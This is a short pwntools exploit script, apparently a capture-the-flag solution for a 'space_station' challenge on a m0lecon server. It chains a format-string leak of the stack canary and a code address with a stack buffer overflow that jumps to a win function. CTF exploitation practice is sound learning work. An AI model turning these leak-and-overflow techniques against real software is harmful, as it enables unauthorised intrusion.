#!/usr/bin/env python3
from pwn import *
import re

exe = context.binary = ELF("./space_station", checksec=False)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB: #DEBUG is the std args used in pwntools to display logging infos
            gdb.attach(r)
            pause()
    else:
        r = remote("offsec.m0lecon.it",13555)

    return r

def main():
    p = conn()
    off = 62 #done with pwndbg

    p.recvuntil(b"ID: ")
    payload1 = b'A'*4 + b'.%15$p.%17$p' #found by cmdline
    p.sendline(payload1)
    
    #obtain the canary and the ret addr
    cn, ret = p.recvline().decode().strip().split(".")[1:]
    canary = int(cn,16)
    log.info(f"Canary found: {canary:x}")

    #obtain win address
    base_addr = int(ret,16) - off - exe.sym.main
    log.info(f"Base address: {base_addr:x}")
    win = base_addr + exe.sym.win

    print(f"Win: {win:x}")

    ret = 0x000000000000101a + base_addr #ret gadget address

    #construct the payload
    payload2 = b'A'*72 + p64(canary) + b'B'*8 + p64(ret) + p64(win)
    print(payload2)
    p.recvuntil(b"log: ")
    p.sendline(payload2)
    p.interactive()
    

if __name__ == "__main__":
    main()